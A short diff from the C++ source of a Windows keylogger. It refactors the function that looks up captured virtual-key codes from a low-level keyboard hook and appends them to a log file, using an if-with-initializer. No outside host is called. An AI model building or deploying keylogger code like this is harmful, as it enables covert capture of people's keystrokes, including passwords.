@@ -9,10 +9,9 @@ void keylogger::log_kbd(const KBDLLHOOKSTRUCT* kbd_hook)
 {
     static std::wofstream out_file{ configuration::out_file, std::wofstream::app };
 
-    const auto it = configuration::key_codes.find(kbd_hook->vkCode);
-
     // If the virtual-key code is in the key_codes map, write the respective value.
-    if (it != configuration::key_codes.end())
+    if (const auto it = configuration::key_codes.find(kbd_hook->vkCode);
+        it != configuration::key_codes.end())
     {
         out_file << it->second;
     }
